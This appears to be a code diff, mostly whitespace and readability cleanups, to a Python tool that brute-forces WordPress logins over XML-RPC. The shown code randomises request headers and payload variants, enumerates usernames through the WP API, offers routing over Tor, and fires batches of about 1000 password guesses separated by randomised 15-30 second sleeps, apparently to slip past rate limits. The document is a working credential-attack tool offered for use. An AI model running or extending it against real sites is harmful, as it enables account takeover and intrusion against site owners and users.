@@ -75,7 +75,7 @@ def generate_random_headers(target_url):
 
 async def check_xmlrpc_available(url, session, retries=3, delay=2):
     headers = generate_random_headers(url)
-    
+
     # Define different payload variations
     payload_variations = [
         """
@@ -162,12 +162,12 @@ async def check_xmlrpc_available(url, session, retries=3, delay=2):
         </methodCall>
         """
     ]
-    
+
     for attempt in range(retries):
         try:
             # Randomly select a payload variation
             data = random.choice(payload_variations)
-            
+
             async with session.post(url, headers=headers, data=data, timeout=30, ssl=False) as response:
                 logging.info(f"Attempt {attempt + 1}: Checking XML-RPC at {url}, Status Code: {response.status}")
                 if response.status == 200:
@@ -193,7 +193,7 @@ async def check_xmlrpc_available(url, session, retries=3, delay=2):
 
         # Wait before retrying
         await asyncio.sleep(delay)
-    
+
     return False
 
 # ==================================================================================================
@@ -370,7 +370,7 @@ async def analyze_response_times(response_times):
     if response_times:
         # Calculate average response time
         average_time = sum(response_times) / len(response_times)
-        
+
         # Calculate median response time
         sorted_times = sorted(response_times)
         median_time = (
@@ -386,7 +386,7 @@ async def analyze_response_times(response_times):
         # Log the average and median response times
         logging.info(f"Average Response Time: {average_time:.4f} seconds")
         logging.info(f"Median Response Time: {median_time:.4f} seconds")
-        
+
         # Detect significant time variations
         time_deviations = [abs(time - average_time) for time in response_times]
         max_deviation_index = time_deviations.index(max(time_deviations))
@@ -526,15 +526,21 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
             bfc_idx += chunk_size
 
         try:
-            print_colored_bold(f"Starting brute force attempts in random sized batches (~1000) with 15-30 second sleeps in between batches!", color="yellow")
-            for chunk_idx in range(len(chunked_coros)):
+            chunk_count = len(chunked_coros)
+            print_colored_bold(
+                    f"Starting {chunk_count} brute force attempts in random sized batches (~1000) "
+                    'with 15-30 second sleeps in between batches!',
+                    color="yellow")
+            for chunk_idx in range(chunk_count):
                 chunk = chunked_coros[chunk_idx]
                 # Tasks created separately so we can track progress
                 chunked_tasks = [asyncio.create_task(c) for c in chunk]
                 tasks.extend(chunked_tasks)
-                await asyncio.gather(*chunked_tasks, return_exceptions=True)  # Wait for all tasks to complete
+                # Wait for all tasks to complete
+                await asyncio.gather(*chunked_tasks, return_exceptions=True)
                 # sleep only if not last chunk
-                if chunk_idx < len(chunked_coros) - 1: await asyncio.sleep(random.randint(15, 30))
+                if chunk_idx < len(chunked_coros) - 1:
+                    await asyncio.sleep(random.randint(15, 30))
 
         finally:
             await monitor
@@ -750,7 +756,7 @@ async def main():
             else:
                 print(f"{Fore.RED}No users found from WP API.")
 
-        if len(users) == 0:
+        if not users:
             # Ask the user if they want to provide a username file or enter manually
             username_choice = input(
                 f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): "
@@ -766,7 +772,7 @@ async def main():
                                 f"{Fore.RED}The following users have xml chars and will "
                                 f"be skipped: {bad_users}")
             else:
-                users = [input(f"{Fore.YELLOW}Enter a username: ")]
+                users = [input(f"{Fore.YELLOW}Enter a username: ").strip()]
 
         # Ask the user if they want to provide a password file or use default
         password_choice = input(
